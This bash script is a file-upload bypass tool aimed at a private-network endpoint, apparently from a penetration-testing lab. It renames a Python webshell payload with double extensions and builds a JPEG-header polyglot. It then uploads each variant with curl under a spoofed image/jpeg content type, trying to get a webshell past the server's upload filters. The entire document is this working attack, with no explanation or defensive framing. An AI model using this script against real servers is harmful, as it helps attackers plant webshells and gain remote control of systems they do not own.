#!/bin/bash

TARGET="http://172.16.10.10:8081/upload"
UPLOAD_FIELD="file"  # Adjust this if the field name differs
TMP_DIR="/tmp/fuzz_upload"
PAYLOAD="python-webshell-check.py"

mkdir -p "$TMP_DIR"
cp "$PAYLOAD" "$TMP_DIR/"

# Create polyglot (JPEG + Python)
echo -e "\xff\xd8\xff\xe0" > "$TMP_DIR/polyglot.jpg" # Minimal JPEG header
cat "$PAYLOAD" >> "$TMP_DIR/polyglot.jpg"

declare -a FILES_TO_TRY=(
  "$TMP_DIR/webshell.jpg"
  "$TMP_DIR/webshell.py.jpg"
  "$TMP_DIR/webshell.jpg.py"
  "$TMP_DIR/webshell.jpeg"
  "$TMP_DIR/polyglot.jpg"
)

# Copy payload and rename variants
cp "$PAYLOAD" "$TMP_DIR/webshell.jpg"
cp "$PAYLOAD" "$TMP_DIR/webshell.py.jpg"
cp "$PAYLOAD" "$TMP_DIR/webshell.jpg.py"
cp "$PAYLOAD" "$TMP_DIR/webshell.jpeg"

echo "[*] Starting file upload fuzzing..."
for file in "${FILES_TO_TRY[@]}"; do
  echo -e "\n[+] Trying to upload: $(basename "$file")"

  curl -s -X POST "$TARGET" \
    -H "Content-Type: multipart/form-data" \
    -F "$UPLOAD_FIELD=@$file;type=image/jpeg" \
    -w "\nStatus: %{http_code}\n" \
    -o /dev/stdout
done

echo -e "\n[*] Done."
